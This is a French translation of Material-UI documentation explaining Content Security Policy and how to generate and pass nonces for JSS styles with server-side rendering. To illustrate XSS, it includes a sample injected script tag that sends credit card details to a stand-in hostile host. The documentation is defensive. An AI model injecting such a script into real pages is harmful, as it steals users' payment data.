# Politique de sécurité du contenu (CSP)

<p class="description">Material-UI supporte une politique de sécurité du contenu.</p>

## Qu'est-ce que le CSP et en quoi est-ce utile ?

Fondamentalement, CSP atténue les attaques XSS (Cross-Site Scripting) en obligeant les développeurs à ajouter aux listes blanches les sources de leurs ressources. Cette liste est renvoyée en tant qu'en-tête du serveur. Par exemple, disons que vous avez un site hébergé à ` https://example.com ` l'en-tête CSP ` default-src: 'self'; ` autorisera toutes les requêtes à destination de ` https://example.com/* ` et refusera tous les autres. Si une section de votre site Web est vulnérable au XSS dans laquelle une entrée d'utilisateur non échappée est affichée, un attaquant pourrait saisir quelque chose du genre :

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>
    

Cette vulnérabilité permettrait à l'attaquant d'exécuter n'importe quoi. Cependant, avec un en-tête CSP sécurisé, le navigateur ne chargera pas ce script.

Vous pouvez en savoir plus sur le CSP [ ici ](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) .

## Comment met-on en place un CSP?

Pour utiliser CSP avec Material-UI (et JSS), vous devez utiliser un "nonce". Un "nonce" est une chaîne générée aléatoirement, utilisée une seule fois. Vous devez donc ajouter un proxy (middleware serveur) pour en générer un à chaque requête. JSS a un [ excellent tutoriel ](https://github.com/cssinjs/jss/blob/master/docs/csp.md) comment y parvenir avec Express et React Helmet. Pour un aperçu de base, continuez à lire.

Un nonce CSP est une chaîne codée en Base 64. Vous pouvez en générer un comme ceci:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

Il est très important d’utiliser UUID version 4, car cela génère un token ** imprévisible. **. Vous appliquez ensuite ce nonce à l'en-tête CSP. Un en-tête CSP pourrait ressembler à ceci avec le nonce appliqué:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

Si vous utilisez le rendu SSR (Server Side Rendering), vous devez transmettre le nonce dans la balise `<style>` sur le serveur.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
/>
```

Ensuite, vous devez transmettre ce nonce à JSS afin qu’il puisse l’ajouter aux balises `<style>` suivantes. Le côté client obtient le nonce à partir d'un en-tête. Vous devez inclure cet en-tête, que le SSR soit utilisé ou non.

```jsx
<meta property="csp-nonce" content={nonce} />
```